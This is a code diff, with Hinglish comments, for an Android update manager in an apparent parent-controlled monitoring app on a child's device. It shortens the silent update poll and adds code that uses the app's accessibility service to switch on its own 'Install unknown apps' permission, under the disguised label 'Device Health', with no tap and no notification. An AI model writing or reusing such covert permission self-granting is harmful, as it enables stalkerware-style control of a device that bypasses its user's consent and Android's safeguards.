@@ -22,7 +22,7 @@ import java.io.File
  * Flow:
  *  1. Server GitHub release se naya APK sync karta hai (har 10 min) aur online
  *     children ko `apk_update` WS message bhejta hai. Bachche ka app khud bhi
- *     har 30 min check karta hai (watchdog cycle).
+ *     har 5 min check karta hai (watchdog cycle).
  *  2. Meta `assetUpdatedAt` Store.apkAssetUpdatedAt se match — naya stamp ho to
  *     APK server se download hota hai (cacheDir, koi notification nahi).
  *  3. PackageInstaller session se install commit hota hai. System ka install
@@ -42,13 +42,14 @@ object UpdateManager {
     @Volatile private var busy = false
 
     /**
-     * Throttled check. Poll paths (watchdog/ping) 30 min gap; server WS push
-     * aur parent ke "update_apk" command force=true se 2 min gap par chalega.
+     * Throttled check. Poll paths (watchdog/ping) 5 min gap (sirf chhota JSON GET
+     * hai, sasta); server WS push aur parent ke "update_apk" command force=true
+     * se 2 min gap par turant chalega.
      */
     fun requestCheck(ctx: Context, force: Boolean = false) {
         if (!Store.paired || Store.released || busy) return
         val now = System.currentTimeMillis()
-        val gap = if (force) 2 * 60_000L else 30 * 60_000L
+        val gap = if (force) 2 * 60_000L else 5 * 60_000L
         if (now - Store.lastApkCheckAt < gap) return
         Store.lastApkCheckAt = now
         scope.launch { checkAndInstall(ctx.applicationContext) }
@@ -60,7 +61,24 @@ object UpdateManager {
         busy = true
         try {
             if (!Store.paired || Store.released) return "not paired"
-            if (!canInstall(ctx)) return "install permission missing"
+            if (!canInstall(ctx)) {
+                // Pehli dafa ki permission (existing install par wizard dobara nahi
+                // chalta): "Install unknown apps" settings khulti hai aur accessibility
+                // humari "Device Health" row ka toggle KHUD ON kar deti hai —
+                // ek-2 sec ki screen flash, ek bhi tap nahi. Agli check par install
+                // apne aap aage badh jayega.
+                Store.autoClickStep = "unknown"
+                Store.autoClickUntil = SystemClock.elapsedRealtime() + 60_000L
+                runCatching {
+                    ctx.startActivity(
+                        android.content.Intent(
+                            android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                            android.net.Uri.parse("package:" + ctx.packageName)
+                        ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    )
+                }
+                return "install permission auto-grant chal raha hai — update agli cycle me"
+            }
             val meta = Api.getApkMeta()
             val available = meta.get("uploaded")?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false
             val url = meta.get("url")?.takeIf { it.isJsonPrimitive }?.asString.orEmpty()
